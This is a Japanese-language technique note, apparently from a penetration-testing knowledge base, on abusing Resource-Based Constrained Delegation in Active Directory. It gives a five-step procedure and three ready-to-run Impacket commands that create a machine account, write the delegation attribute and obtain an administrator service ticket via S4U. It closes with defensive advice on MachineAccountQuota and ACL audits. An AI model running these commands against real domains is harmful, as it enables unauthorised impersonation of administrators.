---
title: RBCD（Resource-Based Constrained Delegation）の悪用
date: 2026-10-17
category: Active Directory
topic: Kerberos
tags: [active-directory, kerberos, delegation, rbcd]
summary: 対象コンピュータの msDS-AllowedToActOnBehalfOfOtherIdentity 属性を書き換え、攻撃者が制御するアカウントから任意ユーザーへのなりすましを成立させる手法
---

## 概要

RBCD（Resource-Based Constrained Delegation）は、委任の許可をリソース（委任される側のコンピュータ）が自分で管理する仕組み。対象コンピュータの `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性に「このアカウントからの委任を許可する」という設定を書き込めると、そのアカウントが対象コンピュータ上の任意ユーザーになりすまして S4U（Service for User）経由でサービスチケットを取得できるようになる。

この属性への書き込み権限（`GenericWrite` や `GenericAll` など）を何らかの経路で持っていれば、攻撃者は自分の支配下にあるコンピュータアカウント（新規作成したものでもよい）を委任元として登録し、対象ホスト上で管理者になりすませる。

## 手順

1. 対象コンピュータの `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性への書き込み権限を確認する（BloodHound で `GenericWrite`/`GenericAll` などのエッジとして見える）。
2. 攻撃者が制御するマシンアカウントを用意する。ドメインの既定設定では、一般ユーザーでも一定数までコンピュータアカウントを新規作成できることが多い。
3. 対象コンピュータの RBCD 設定に、作成したマシンアカウントからの委任を許可するよう書き込む。
4. S4U（S4U2Self → S4U2Proxy）を使い、対象コンピュータ上の任意ユーザー（例: 管理者）になりすましたサービスチケットを取得する。
5. 取得したチケットで対象コンピュータにアクセスする。

## コマンド

```
# 1. マシンアカウント作成
addcomputer.py corp.local/user:'Password123' -computer-name 'EVIL$' -computer-pass 'Evil123!' -dc-ip <DC_IP>

# 2. RBCD 設定
rbcd.py -delegate-to 'TARGET$' -delegate-from 'EVIL$' -dc-ip <DC_IP> -action write corp.local/user:'Password123'

# 3. S4U で administrator になりすまし TGS を取得
getST.py -spn 'cifs/target.corp.local' -impersonate administrator -dc-ip <DC_IP> corp.local/'EVIL$':'Evil123!'
```

## 注意点

- 一般ユーザーが新規コンピュータアカウントを作成できる既定の上限（`ms-DS-MachineAccountQuota`）は、RBCD 攻撃の前提になりやすい。守る側はこのクォータを 0 に設定しておくことが推奨される。
- RBCD は「対象コンピュータへの書き込み権限」さえあれば、ドメイン管理者権限がなくても成立する点が特徴。ACL の棚卸しで、コンピュータオブジェクトへの不要な書き込み権限を見つけたら要注意。
